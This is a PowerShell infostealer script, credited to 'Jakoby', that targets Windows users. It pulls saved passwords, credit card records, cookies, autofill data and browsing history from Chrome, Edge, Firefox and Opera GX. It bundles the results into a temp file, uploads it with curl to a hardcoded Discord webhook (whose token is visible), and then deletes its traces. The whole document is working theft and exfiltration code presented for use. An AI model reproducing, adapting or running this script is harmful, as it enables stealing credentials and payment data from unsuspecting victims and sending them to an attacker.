# Title: Browser Data Exfiltration with Remote Script Execution (2024 Professional Update)
# Author: Jakoby
# Description: This script extracts saved usernames/passwords, credit card information, cookies, autofill data, and browsing history from Chrome, Edge, Firefox, and Opera GX on Windows 10/11 targets.

# Target OS: Windows 10, 11

# Validate the presence of sqlite3.exe to avoid repeated checks
$sqliteCommand = "sqlite3.exe"
if (-not (Test-Path $sqliteCommand)) {
    throw "sqlite3.exe not found. Exiting script."
}

function Get-BrowserData {
    [CmdletBinding()]
    param (
        [Parameter(Position = 1, Mandatory = $True)]
        [string]$Browser,
        [Parameter(Position = 2, Mandatory = $True)]
        [string]$DataType
    )

    $Path = switch ($Browser) {
        'chrome'  { 
            if ($DataType -eq 'passwords') { "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data" }
            elseif ($DataType -eq 'creditcards') { "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Web Data" }
            elseif ($DataType -eq 'cookies') { "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Cookies" }
            elseif ($DataType -eq 'autofill') { "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Web Data" }
            elseif ($DataType -eq 'history') { "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History" }
        }
        'edge'    {
            if ($DataType -eq 'passwords') { "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Login Data" }
            elseif ($DataType -eq 'creditcards') { "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Web Data" }
            elseif ($DataType -eq 'cookies') { "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Cookies" }
            elseif ($DataType -eq 'autofill') { "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Web Data" }
            elseif ($DataType -eq 'history') { "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History" }
        }
        'firefox' {
            if ($DataType -eq 'passwords') { "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\logins.json" }
            elseif ($DataType -eq 'cookies') { "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite" }
            elseif ($DataType -eq 'history') { "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite" }
        }
        'opera'   {
            if ($DataType -eq 'passwords') { "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Login Data" }
            elseif ($DataType -eq 'creditcards') { "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Web Data" }
            elseif ($DataType -eq 'cookies') { "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Cookies" }
            elseif ($DataType -eq 'autofill') { "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Web Data" }
            elseif ($DataType -eq 'history') { "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History" }
        }
        default { throw "Unsupported browser or data type specified." }
    }

    if (-not (Test-Path $Path)) {
        throw "The path for $Browser $DataType could not be found."
    }

    try {
        if ($DataType -eq 'passwords' -and ($Browser -eq 'chrome' -or $Browser -eq 'edge' -or $Browser -eq 'opera')) {
            $query = "SELECT origin_url, username_value, password_value FROM logins"
            $passwordData = & $sqliteCommand $Path $query
            Write-Output "[$Browser Passwords]: $passwordData"
        } elseif ($DataType -eq 'passwords' -and $Browser -eq 'firefox') {
            $firefoxData = Get-Content -Path $Path | ConvertFrom-Json
            Write-Output "[Firefox Passwords]: $($firefoxData.logins)"
        } elseif ($DataType -eq 'creditcards' -and ($Browser -eq 'chrome' -or $Browser -eq 'edge' -or $Browser -eq 'opera')) {
            $query = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
            $creditCardData = & $sqliteCommand $Path $query
            Write-Output "[$Browser Credit Cards]: $creditCardData"
        } elseif ($DataType -eq 'cookies' -or $DataType -eq 'autofill' -or $DataType -eq 'history') {
            $query = switch ($DataType) {
                'cookies' { "SELECT host_key, name, encrypted_value FROM cookies" }
                'autofill' { "SELECT name, value FROM autofill" }
                'history' { "SELECT url, title, visit_count FROM urls" }
            }
            $data = & $sqliteCommand $Path $query
            Write-Output "[$Browser $DataType]: $data"
        } else {
            throw "Unsupported data type for $Browser."
        }
    } catch {
        throw "Failed to extract $DataType from $Browser: $($_.Exception.Message)"
    }
}

# Define exfiltration method (Discord webhook)
$dc = 'https://discord.com/api/webhooks/1225028544258641981/kmftS6B2qpwjcNBn3ovPTEoI8MVsRDikLkYZr1tUTuHNohr-A6ljyvd3MRRGwmI8ehOo'

# Check if Discord webhook is set
if ([string]::IsNullOrEmpty($dc)) {
    throw 'No exfiltration method set. Exiting.'
}

# Collect browser data in parallel
$outputDir = "$env:TMP\BrowserData"
if (-not (Test-Path $outputDir)) {
    New-Item -ItemType Directory -Path $outputDir | Out-Null
}
try {
    $browsers = @("edge", "chrome", "firefox", "opera")
    $dataTypes = @("passwords", "creditcards", "cookies", "autofill", "history")

    $jobs = @()
    foreach ($browser in $browsers) {
        foreach ($dataType in $dataTypes) {
            $outputFile = "$outputDir\${browser}_${dataType}.txt"
            $jobs += Start-Job -ScriptBlock {
                param ($browser, $dataType, $outputFile)
                $data = Get-BrowserData -Browser $browser -DataType $dataType
                if ($data) {
                    Add-Content -Path $outputFile -Value $data
                }
            } -ArgumentList $browser, $dataType, $outputFile
        }
    }

    # Wait for all jobs to complete
    $jobs | ForEach-Object { $_ | Wait-Job; Remove-Job $_ }
} catch {
    throw "Failed to collect browser data: $($_.Exception.Message)"
}

# Combine all output files into one
$outputFile = "$env:TMP\BrowserData.txt"
Get-ChildItem -Path $outputDir -Filter *.txt | ForEach-Object {
    Get-Content $_.FullName | Add-Content -Path $outputFile
}

# Ensure output file is not empty
if (-not (Test-Path $outputFile) -or (Get-Item $outputFile).Length -eq 0) {
    throw "No data collected. Exiting."
}

# Send completion notification to Discord
try {
    $body = @{ "content" = 'Browser data exfiltration script executed successfully, including browser data.' } | ConvertTo-Json
    Invoke-RestMethod -Uri $dc -Method Post -Body $body -ContentType 'application/json' -UseBasicParsing
    $response = curl.exe -F "file1=@$outputFile" $dc
    if ($LASTEXITCODE -ne 0) {
        throw "Failed to upload file to Discord webhook. Response: $response"
    }
} catch {
    throw "Failed to send notification to Discord webhook: $($_.Exception.Message)"
}

# Clean up
try {
    Remove-Item -Path $outputDir -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $outputFile -Force -ErrorAction SilentlyContinue
} catch {
    throw "Failed to clean up the output files: $($_.Exception.Message)"
}
